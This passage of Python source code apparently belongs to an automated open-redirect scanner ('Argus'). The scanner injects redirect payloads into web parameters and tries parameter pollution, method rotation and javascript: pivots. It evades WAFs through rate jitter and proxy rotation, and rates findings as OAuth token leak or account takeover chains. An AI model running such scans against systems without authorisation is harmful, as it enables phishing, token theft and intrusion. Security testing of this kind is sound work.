    payload = _render_payload(payload_obj.template, target_host, confirmation)

    if surface.location == "query":
        test_url = _build_test_url(surface.url, surface.param_name, payload)
        r = session.get(test_url, headers=headers)
        curl = _build_curl("GET", test_url, headers)
    elif surface.location == "body":
        r = session.request(
            "POST", surface.url, headers=headers,
            data={surface.param_name: payload},
        )
        curl = _build_curl("POST", surface.url, headers,
                           form_body={surface.param_name: payload})
    else:
        return findings

    if not r or _has_denial_marker(r):
        return findings

    # Detection 1 — headers
    for hname, hval in _detect_redirect_headers(r):
        analysis = _analyze_redirect(hval, target_host, confirmation)
        if not (analysis.is_external or analysis.is_confirmation_domain):
            continue
        if payload_obj.vector_class == "xss_pivot" and analysis.is_external:
            continue
        findings.append(_make_finding(
            surface, payload_obj, payload, r, analysis, hname, curl,
            target_host, confirmation, waf, auth_on,
        ))
        return findings

    # Detection 2 — JSON body
    for jkey, jval in _detect_json_body_redirect(r):
        analysis = _analyze_redirect(jval, target_host, confirmation)
        if not (analysis.is_external or analysis.is_confirmation_domain):
            continue
        if payload_obj.vector_class == "xss_pivot" and analysis.is_external:
            continue
        findings.append(_make_finding(
            surface, payload_obj, payload, r, analysis,
            f"json_body:{jkey}", curl, target_host, confirmation, waf, auth_on,
            vector="json_body",
        ))
        return findings

    # Detection 3 & 4 — client-side
    for vector, url_val in _detect_client_side(r.text or ""):
        analysis = _analyze_redirect(url_val, target_host, confirmation)
        if not (analysis.is_external or analysis.is_confirmation_domain):
            continue
        if payload_obj.vector_class == "xss_pivot" and analysis.is_external:
            continue
        findings.append(_make_finding(
            surface, payload_obj, payload, r, analysis,
            f"{vector}:{url_val[:60]}", curl, target_host, confirmation,
            waf, auth_on, vector=vector,
        ))
        return findings

    return findings


def _make_finding(
    surface: RedirectSurface,
    payload_obj: Payload,
    payload: str,
    resp: requests.Response,
    analysis: RedirectAnalysis,
    source: str,
    curl: str,
    target_host: str,
    confirmation: str,
    waf: WAFReport,
    auth_on: bool,
    vector: str = "server_side",
) -> OpenRedirectFinding:
    # Confirmation logic
    confirmed = analysis.is_confirmation_domain and payload_obj.can_confirm
    if payload_obj.vector_class == "xss_pivot":
        confirmed = False

    severity = _score_severity(surface, analysis, payload_obj, confirmed)

    # Base confidence
    if confirmed:
        confidence = min(70 + payload_obj.boost + _context_score(surface.param_name), 100)
    elif payload_obj.vector_class == "xss_pivot" and analysis.is_confirmation_domain:
        confidence = 60
    else:
        confidence = 45

    chain_ids = _chain_id_for(surface, payload_obj, confirmed, vector)

    return OpenRedirectFinding(
        target=surface.url,
        param_name=surface.param_name,
        param_location=surface.location,
        vector=vector,
        severity=severity,
        confidence=confidence,
        confirmed=confirmed,
        payload=payload,
        payload_label=payload_obj.label,
        evidence=(
            f"HTTP {resp.status_code} via {source} → "
            f"{analysis.normalized_location[:200]} "
            f"(host={analysis.actual_host})"
        ),
        redirect_location=analysis.normalized_location,
        http_status=resp.status_code,
        is_oauth=surface.is_oauth,
        is_sso=surface.is_sso,
        chain_ids=chain_ids,
        request_curl=curl,
        waf_vendor=waf.vendor,
        auth_enabled=auth_on,
        first_seen=_db_now(),
        details={
            "target_host":         target_host,
            "actual_host":         analysis.actual_host,
            "confirmation_domain": confirmation,
            "detection_source":    source,
            "payload_class":       payload_obj.vector_class,
            "can_confirm":         payload_obj.can_confirm,
            "is_oauth_endpoint":   surface.is_oauth,
            "is_sso_endpoint":     surface.is_sso,
            "is_pwreset_endpoint": surface.is_pwreset,
            "is_email_verify":     surface.is_email_verify,
            "oauth_markers":       surface.oauth_markers,
        },
    )


# ═════════════════════════════════════════════════════════════════════════════
#  SEVERITY SCORING
# ═════════════════════════════════════════════════════════════════════════════

def _score_severity(
    surface: RedirectSurface,
    analysis: RedirectAnalysis,
    payload_obj: Payload,
    confirmed: bool,
) -> Severity:
    if not confirmed:
        # XSS pivots that landed as-is get at least LOW
        if payload_obj.vector_class == "xss_pivot" and analysis.is_confirmation_domain:
            return Severity.LOW
        return Severity.INFO

    # ── OAuth / SSO chain → CRITICAL (token / assertion leak) ─────────────
    if surface.is_oauth and surface.param_name.lower() in OAUTH_PARAMS:
        return Severity.CRITICAL
    if surface.is_sso:
        return Severity.CRITICAL

    # ── Auth-adjacent flow → HIGH ─────────────────────────────────────────
    if surface.param_name.lower() in OAUTH_PARAMS:
        return Severity.HIGH
    if surface.param_name.lower() in (
        "next", "continue", "return", "return_url", "returnto",
        "back", "backto",
    ):
        return Severity.HIGH
    if surface.is_pwreset or surface.is_email_verify:
        return Severity.HIGH

    # ── Generic confirmed redirect → MEDIUM ───────────────────────────────
    return Severity.MEDIUM


def _chain_id_for(
    surface: RedirectSurface,
    payload_obj: Payload,
    confirmed: bool,
    vector: str,
) -> list[str]:
    ids: list[str] = []
    if payload_obj.vector_class == "xss_pivot":
        ids.append("open-redirect-xss")
        return ids
    if not confirmed:
        return ids

    if surface.is_oauth and surface.param_name.lower() in OAUTH_PARAMS:
        ids.append("open-redirect-oauth")
    elif surface.is_sso:
        ids.append("open-redirect-sso")
    elif surface.is_pwreset or surface.is_email_verify:
        ids.append("open-redirect-pwreset")
    else:
        ids.append("open-redirect-phishing")

    if vector in ("meta_refresh", "dom_sink"):
        ids.append("open-redirect-clientside")

    return ids


# ═════════════════════════════════════════════════════════════════════════════
#  TESTING HELPERS
# ═════════════════════════════════════════════════════════════════════════════

def test_server_side(
    session: EvasionSession,
    surface: RedirectSurface,
    headers: Optional[dict],
    target_host: str,
    confirmation: str,
    waf: WAFReport,
    auth_on: bool,
    aggressive: bool = False,
) -> list[OpenRedirectFinding]:
    """Iterate PAYLOAD_MATRIX. Return confirmed finding if any, else best candidate."""
    best: Optional[OpenRedirectFinding] = None

    for payload_obj in PAYLOAD_MATRIX:
        if payload_obj.aggressive_only and not aggressive:
            continue
        if payload_obj.vector_class == "xss_pivot" and surface.location != "query":
            continue

        hits = _test_one_payload(
            session, surface, payload_obj, headers, target_host,
            confirmation, waf, auth_on,
        )
        if not hits:
            continue

        hit = hits[0]
        if hit.confirmed:
            return [hit]
        if best is None or hit.confidence > best.confidence:
            best = hit

    return [best] if best else []


def test_client_side_payloads(
    session: EvasionSession,
    surface: RedirectSurface,
    headers: Optional[dict],
    target_host: str,
    confirmation: str,
    waf: WAFReport,
    auth_on: bool,
) -> list[OpenRedirectFinding]:
    findings: list[OpenRedirectFinding] = []
    for payload_obj in CLIENT_PAYLOADS:
        payload = _render_payload(payload_obj.template, target_host, confirmation)
        if surface.location == "query":
            test_url = _build_test_url(surface.url, surface.param_name, payload)
            r = session.get(test_url, headers=headers)
            curl = _build_curl("GET", test_url, headers)
        elif surface.location == "body":
            r = session.request(
                "POST", surface.url, headers=headers,
                data={surface.param_name: payload},
            )
            curl = _build_curl("POST", surface.url, headers,
                               form_body={surface.param_name: payload})
        else:
            continue

        if not r or r.status_code >= 500 or _has_denial_marker(r):
            continue

        for vector, url_val in _detect_client_side(r.text or ""):
            analysis = _analyze_redirect(url_val, target_host, confirmation)
            if not (analysis.is_external or analysis.is_confirmation_domain):
                continue
            findings.append(_make_finding(
                surface, payload_obj, payload, r, analysis,
                f"{vector}:{url_val[:60]}", curl, target_host, confirmation,
                waf, auth_on, vector=vector,
            ))
            if findings:
                return findings
    return findings


def test_param_pollution(
    session: EvasionSession,
    surface: RedirectSurface,
    headers: Optional[dict],
    target_host: str,
    confirmation: str,
    waf: WAFReport,
    auth_on: bool,
) -> list[OpenRedirectFinding]:
    if surface.location != "query":
        return []
    parsed = urllib.parse.urlparse(surface.url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    polluted = params + [(surface.param_name, f"https://{confirmation}")]
    test_url = urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(polluted))
    )
    r = session.get(test_url, headers=headers)
    if not r or _has_denial_marker(r):
        return []

    for hname, hval in _detect_redirect_headers(r):
        analysis = _analyze_redirect(hval, target_host, confirmation)
        if analysis.is_confirmation_domain:
            payload_obj = Payload("hpp", f"https://{confirmation}", 20)
            return [_make_finding(
                surface, payload_obj, f"https://{confirmation}", r,
                analysis, f"hpp:{hname}", _build_curl("GET", test_url, headers),
                target_host, confirmation, waf, auth_on,
            )]
    return []


def test_method_rotation(
    session: EvasionSession,
    surface: RedirectSurface,
    headers: Optional[dict],
    target_host: str,
    confirmation: str,
    waf: WAFReport,
    auth_on: bool,
) -> list[OpenRedirectFinding]:
    if surface.location not in ("query", "body"):
        return []
    payload = f"https://{confirmation}"
    for alt_method in ("POST", "PUT", "PATCH"):
        if alt_method == "POST" and surface.location == "body":
            continue
        if surface.location == "query":
            test_url = _build_test_url(surface.url, surface.param_name, payload)
            r = session.request(
                alt_method, test_url, headers=headers,
                data={surface.param_name: payload},
            )
        else:
            r = session.request(
                alt_method, surface.url, headers=headers,
                data={surface.param_name: payload},
            )
        if not r or not (300 <= r.status_code < 400):
            continue
        loc = r.headers.get("Location", "")
        analysis = _analyze_redirect(loc, target_host, confirmation)
        if analysis.is_confirmation_domain:
            payload_obj = Payload(
                f"method_{alt_method.lower()}", payload, 20,
            )
            return [_make_finding(
                surface, payload_obj, payload, r, analysis,
                f"method:{alt_method}",
                _build_curl(alt_method, surface.url, headers,
                            form_body={surface.param_name: payload}),
                target_host, confirmation, waf, auth_on,
            )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  CHAINS
# ═════════════════════════════════════════════════════════════════════════════

def build_chains(findings: list[OpenRedirectFinding]) -> list[OpenRedirectChain]:
    chains: dict[str, list[OpenRedirectFinding]] = {}
    NAMES = {
        "open-redirect-oauth":     "OAuth redirect_uri bypass → token leak",
        "open-redirect-sso":       "SAML/SSO redirect bypass → assertion theft",
        "open-redirect-pwreset":   "Password-reset redirect → account takeover",
        "open-redirect-phishing":  "Generic open redirect → phishing surface",
        "open-redirect-xss":       "javascript: redirect pivot → stored XSS",
        "open-redirect-clientside":"Client-side redirect sink",
    }
    for f in findings:
        for cid in f.chain_ids:
            chains.setdefault(cid, []).append(f)

    out: list[OpenRedirectChain] = []
    for cid, fs in chains.items():
        max_sev = max(fs, key=lambda x: x.severity.rank).severity
        out.append(OpenRedirectChain(
            chain_id=cid,
            name=NAMES.get(cid, cid),
            severity=max_sev,
            steps=[f.evidence for f in fs],
            finding_hashes=[f.finding_hash for f in fs],
            evidence=fs[0].evidence if fs else "",
        ))
    return out


# ═════════════════════════════════════════════════════════════════════════════
#  DB SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[OpenRedirectFinding]) -> None:
    if not findings or not DB_AVAILABLE or DB is None:
        return
    if not _cfg("SYNC_TO_DB", True) or not _cfg("BRIDGE_ENABLED", False):
        return
    if not getattr(DB, "available", False):
        return
    method = getattr(DB, "upsert_open_redirect_findings", None)
    if method is None:
        log.warning(
            "  DB sync: db.py is missing upsert_open_redirect_findings() — "
            "add the method to enable dedicated-table sync"
        )
        return
    try:
        result = method(scan_id, [f.to_dict() for f in findings])
        if result is not None:
            log.info(
                f"  DB sync: {result} open-redirect finding(s) "
                f"upserted (scan_id={scan_id})"
            )
    except Exception as e:
        log.warning(f"  DB sync: exception — {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_open_redirect_audit(
    urls_file: Path,
    outdir: Path,
    *,
    headers: Optional[dict] = None,
    max_urls: int = MAX_URLS,
    test_client_side: bool = True,
    test_bypasses: bool = True,
    aggressive: bool = False,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    proxies: Optional[list[str]] = None,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()

    settings = _redirect_settings()
    eff_rate = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout = settings["timeout"]
    eff_jitter = settings["jitter"]
    eff_proxies = proxies if proxies is not None else list(settings["proxies"])
    confirmation = _confirmation_domain()

    urls = _load_urls(urls_file)
    if len(urls) > max_urls:
        log.warning(f"  Capping at {max_urls} URLs (input had {len(urls)})")
        urls = urls[:max_urls]
    outdir.mkdir(parents=True, exist_ok=True)

    cfg_hdrs = _target_headers()
    if headers:
        for k, v in headers.items():
            cfg_hdrs.setdefault(k, v)
    auth_on = bool(cfg_hdrs)

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Confirm: https://{confirmation}")
    log.info(f"  Config : rate_limit={eff_rate}/s  jitter={eff_jitter}s  "
             f"concurrency={eff_conc}  timeout={eff_timeout}s")
    log.info(f"  Mode   : {'AGGRESSIVE' if aggressive else 'safe'}")
    log.info(f"  Auth   : {'yes' if auth_on else 'no'}")
    if eff_proxies:
        log.info(f"  Proxies: {len(eff_proxies)} (rotation)")
    log.info("")

    if not urls:
        log.warning("  No URLs — writing empty report")
        return _write_empty(outdir, urls_file, start)

    profile = EvasionProfile(
        rate_limit=eff_rate, jitter=eff_jitter, proxies=eff_proxies,
    )

    all_findings: list[OpenRedirectFinding] = []
    waf_by_host: dict[str, WAFReport] = {}

    with EvasionSession(profile=profile, timeout=eff_timeout) as session:
        # ── Phase 0: WAF detection ──────────────────────────────────────────
        log.info("  Phase 0 — WAF detection")
        seen_hosts: set[str] = set()
        for url in urls:
            host = urllib.parse.urlparse(url).hostname or ""
            if host in seen_hosts:
                continue
            seen_hosts.add(host)
            waf = detect_waf(session, url)
            waf_by_host[host] = waf
            if waf.vendor != "unknown":
                log.info(f"    {host:<40} WAF: {waf.vendor} ({waf.confidence}%)")

        if any(w.vendor != "unknown" for w in waf_by_host.values()):
            session.profile.rate_limit = max(0.5, eff_rate * 0.6)
            session.profile.jitter = max(eff_jitter, 0.8)

        # ── Phase 1: Surface discovery ──────────────────────────────────────
        log.info("")
        log.info("  Phase 1 — Surface discovery")
        surfaces = discover_surfaces(urls)
        surfaces.extend(discover_surfaces_from_pages(outdir))
        seen_surf: set[tuple] = set()
        unique: list[RedirectSurface] = []
        for s in surfaces:
            key = (s.url, s.param_name, s.location)
            if key not in seen_surf:
                seen_surf.add(key)
                unique.append(s)
        surfaces = unique

        oauth_count = sum(1 for s in surfaces if s.is_oauth)
        sso_count = sum(1 for s in surfaces if s.is_sso)
        pw_count = sum(1 for s in surfaces if s.is_pwreset)
        log.info(f"    {len(surfaces)} surface(s) "
                 f"(OAuth={oauth_count}, SSO={sso_count}, pwreset={pw_count})")

        if not surfaces:
            log.warning("  No surfaces — writing empty report")
            return _write_empty(outdir, urls_file, start, total_input=len(urls))

        # ── Phase 2: Baseline ───────────────────────────────────────────────
        log.info("")
        log.info("  Phase 2 — Baseline discipline")

        def _baseline_check(s: RedirectSurface) -> tuple[RedirectSurface, bool]:
            host = urllib.parse.urlparse(s.url).hostname or ""
            return s, is_param_honored(session, s, cfg_hdrs, host, confirmation)

        honored: list[RedirectSurface] = []
        if surfaces:
            with ThreadPoolExecutor(max_workers=eff_conc) as pool:
                futures = {pool.submit(_baseline_check, s): s for s in surfaces}
                for fut in as_completed(futures):
                    try:
                        s, ok = fut.result()
                        if ok:
                            honored.append(s)
                    except Exception as e:
                        log.debug(f"    baseline error: {e}")
                        honored.append(futures[fut])

        skipped = len(surfaces) - len(honored)
        log.info(f"    {len(honored)} honored, {skipped} skipped (param ignored/hardcoded)")

        if not honored:
            log.warning("  No honored surfaces — writing empty report")
            return _write_empty(outdir, urls_file, start, total_input=len(urls))

        # ── Phase 3–4: Test ─────────────────────────────────────────────────
        log.info("")
        log.info(f"  Phase 3–4 — Testing {len(honored)} surface(s)")

        def _process(surface: RedirectSurface) -> list[OpenRedirectFinding]:
            local: list[OpenRedirectFinding] = []
            parsed = urllib.parse.urlparse(surface.url)
            host = parsed.hostname or ""
            waf = waf_by_host.get(host, WAFReport())

            local.extend(test_server_side(
                session, surface, cfg_hdrs, host, confirmation,
                waf, auth_on, aggressive,
            ))

            if not any(f.confirmed for f in local):
                if test_client_side:
                    local.extend(test_client_side_payloads(
                        session, surface, cfg_hdrs, host, confirmation,
                        waf, auth_on,
                    ))
                if test_bypasses:
                    local.extend(test_param_pollution(
                        session, surface, cfg_hdrs, host, confirmation,
                        waf, auth_on,
                    ))
                    if not any(f.confirmed for f in local):
                        local.extend(test_method_rotation(
                            session, surface, cfg_hdrs, host, confirmation,
                            waf, auth_on,
                        ))
            return local

        with ThreadPoolExecutor(max_workers=eff_conc) as pool:
            futures = {pool.submit(_process, s): s for s in honored}
            for fut in as_completed(futures):
                s = futures[fut]
                try:
                    results = fut.result()
                    if results:
                        all_findings.extend(results)
                        confirmed = sum(1 for r in results if r.confirmed)
                        tag = f" ({confirmed} confirmed)" if confirmed else ""
                        log.info(
                            f"    {s.param_name:<22} {s.url[:50]:<50} "
                            f"{len(results)}{tag}"
                        )
                except Exception as e:
                    log.debug(f"    error on {s.url}: {e}")

    # ── Phase 5: Chains ────────────────────────────────────────────────────
    log.info("")
    log.info("  Phase 5 — Chain aggregation")
    chains = build_chains(all_findings)
    log.info(f"    {len(chains)} chain(s)")

    # ── Dedupe ─────────────────────────────────────────────────────────────
    seen_f: set[tuple] = set()
    deduped: list[OpenRedirectFinding] = []
    for f in all_findings:
        key = (f.target, f.param_name, f.vector)
        if key in seen_f:
            continue
        seen_f.add(key)
        deduped.append(f)
    deduped.sort(key=lambda f: (-f.severity.rank, -f.confidence, f.target))

    # ── Reports ────────────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_sev: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    by_vector: dict[str, int] = {}
    confirmed_list: list[OpenRedirectFinding] = []
    oauth_list: list[OpenRedirectFinding] = []

    for f in deduped:
        by_sev[f.severity.value] = by_sev.get(f.severity.value, 0) + 1
        by_vector[f.vector] = by_vector.get(f.vector, 0) + 1
        if f.confirmed:
            confirmed_list.append(f)
        if f.is_oauth or f.is_sso:
            oauth_list.append(f)

    # Full findings
    json_path = outdir / "open_redirect_findings.json"
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "auth_enabled": auth_on,
        "aggressive": aggressive,
        "config": {
            "confirmation_domain": confirmation,
            "rate_limit":          eff_rate,
            "jitter":              eff_jitter,
            "concurrency":         eff_conc,
            "timeout":             eff_timeout,
            "proxies":             len(eff_proxies),
            "test_client_side":    test_client_side,
            "test_bypasses":       test_bypasses,
            "headers_count":       len(cfg_hdrs),
        },
        "totals": {
            "urls_input":       len(urls),
            "surfaces":         len(surfaces),
            "honored_surfaces": len(honored),
            "total_findings":   len(deduped),
            "confirmed":        len(confirmed_list),
            "oauth_findings":   len(oauth_list),
            "critical":         by_sev["CRITICAL"],
            "high":             by_sev["HIGH"],
            "medium":           by_sev["MEDIUM"],
            "low":              by_sev["LOW"],
            "info":             by_sev["INFO"],
        },
        "summary": {
            "by_severity": by_sev,
            "by_vector":   dict(sorted(by_vector.items(), key=lambda kv: -kv[1])),
        },
        "findings": [f.to_dict() for f in deduped],
    }
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # Confirmed-only report
    confirmed_high = [f for f in deduped if f.severity.rank >= Severity.HIGH.rank]
    (outdir / "open_redirect_confirmed.json").write_text(
        json.dumps({
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "input_file": str(urls_file),
            "totals": {
                "confirmed": len(confirmed_high),
                "critical":  sum(1 for f in confirmed_high if f.severity == Severity.CRITICAL),
                "high":      sum(1 for f in confirmed_high if f.severity == Severity.HIGH),
                "by_chain": {
                    c: sum(1 for f in confirmed_high if c in f.chain_ids)
                    for c in {cid for f in confirmed_high for cid in f.chain_ids}
                },
            },
            "findings": [f.to_dict() for f in confirmed_high],
        }, indent=2, ensure_ascii=False) + "\n"
    )

    # Chains
    (outdir / "open_redirect_chains.json").write_text(
        json.dumps({
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "chains": [c.to_dict() for c in chains],
        }, indent=2, ensure_ascii=False) + "\n"
    )

    # Flat files
    (outdir / "open_redirect_candidates.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param_name}\t{f.vector}\t{f.severity.value}\t"
            f"{f.confidence}\t{'CONFIRMED' if f.confirmed else 'candidate'}\t"
            f"{f.evidence[:160]}"
            for f in deduped
        ) + ("\n" if deduped else "")
    )
    (outdir / "open_redirect_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param_name}\t{f.payload_label}\t"
            f"{f.severity.value}\t{f.redirect_location[:120]}"
            for f in confirmed_list
        ) + ("\n" if confirmed_list else "")
    )
    (outdir / "open_redirect_oauth.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param_name}\t{f.severity.value}\t{f.evidence[:120]}"
            for f in oauth_list
        ) + ("\n" if oauth_list else "")
    )

    # DB sync
    if scan_id is not None:
        log.info("")
        log.info(f"  Syncing to remote database (scan_id={scan_id})...")
        _self_sync(scan_id, deduped)

    # Console summary
    log.info("")
    log.info("  Outputs :")
    log.info(f"    open_redirect_findings.json     {len(deduped):>5} finding(s)")
    log.info(f"    open_redirect_confirmed.json    {len(confirmed_high):>5} confirmed (HIGH+)")
    log.info(f"    open_redirect_chains.json       {len(chains):>5} chain(s)")
    log.info(f"    open_redirect_candidates.txt    {len(deduped):>5} candidate(s)")
    log.info(f"    open_redirect_confirmed.txt     {len(confirmed_list):>5} confirmed")
    log.info(f"    open_redirect_oauth.txt         {len(oauth_list):>5} OAuth/SSO")
    log.info("")
    log.info(f"  Severity : CRITICAL={by_sev['CRITICAL']}  HIGH={by_sev['HIGH']}  "
             f"MEDIUM={by_sev['MEDIUM']}  LOW={by_sev['LOW']}  INFO={by_sev['INFO']}")
    log.info(f"  Confirmed: {len(confirmed_list)} / {len(deduped)}")
    if chains:
        log.info("  Chains   : " + " · ".join(
            f"{c.chain_id}({c.severity.value})" for c in chains
        ))
    if confirmed_high:
        log.info("")
        log.info("  Confirmed findings (HIGH+):")
        for f in confirmed_high[:12]:
            tag = f" [{','.join(f.chain_ids)}]" if f.chain_ids else ""
            log.info(f"    [{f.severity.value:<8}] {f.vector:<14} "
                     f"{f.param_name:<20} {f.target[:50]}{tag}")
    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty(
    outdir: Path, input_file: Path, start: float, total_input: int = 0,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "auth_enabled": False,
        "aggressive": False,
        "config": {},
        "totals": {
            "urls_input": total_input, "surfaces": 0, "honored_surfaces": 0,
            "total_findings": 0, "confirmed": 0, "oauth_findings": 0,
            "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0,
        },
        "summary": {"by_severity": {}, "by_vector": {}},
        "findings": [],
    }
    path = outdir / "open_redirect_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    (outdir / "open_redirect_confirmed.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "input_file": str(input_file),
        "totals": {"confirmed": 0, "critical": 0, "high": 0, "by_chain": {}},
        "findings": [],
    }, indent=2) + "\n")
    (outdir / "open_redirect_chains.json").write_text(json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "chains": [],
    }, indent=2) + "\n")
    for name in (
        "open_redirect_candidates.txt", "open_redirect_confirmed.txt",
        "open_redirect_oauth.txt",
    ):
        (outdir / name).write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "live_urls.txt"

    parser = argparse.ArgumentParser(description="Argus Open Redirect Auditor v4")
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=base / "output")
    parser.add_argument("--scan-id", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--concurrency", type=int, default=None)
    parser.add_argument("--proxies", default=None)
    parser.add_argument("--cookie", help="Session cookie for authenticated testing")
    parser.add_argument("--aggressive", action="store_true")
    parser.add_argument("--no-client-side", action="store_true")
    parser.add_argument("--no-bypasses", action="store_true")
    args = parser.parse_args()

    hdrs = {"Cookie": args.cookie} if args.cookie else None
    proxies = args.proxies.split(",") if args.proxies else None

    try:
        run_open_redirect_audit(
            args.input, args.output,
            headers=hdrs,
            test_client_side=not args.no_client_side,
            test_bypasses=not args.no_bypasses,
            aggressive=args.aggressive,
            rate_limit=args.rate_limit,
            concurrency=args.concurrency,
            proxies=proxies,
            scan_id=args.scan_id,
        )
    except Exception as e:
        log.error(f"failed: {e}")
        import traceback
        log.debug(traceback.format_exc())
        sys.exit(1)
